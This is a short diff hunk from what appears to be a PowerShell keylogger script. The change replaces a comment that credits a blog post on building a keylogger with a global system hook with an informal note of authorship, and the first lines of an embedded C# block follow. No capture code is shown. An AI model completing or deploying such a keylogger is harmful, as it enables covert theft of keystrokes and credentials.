@@ -1,4 +1,4 @@
-# Extracted from this site: https://hinchley.net/2013/11/03/creating-a-key-logger-via-a-global-system-hook-using-powershell/
+# NOT MINE, but edited by me, so it's sorta mine? I don't know...
 Add-Type -TypeDefinition @"
 using System;
 using System.IO;
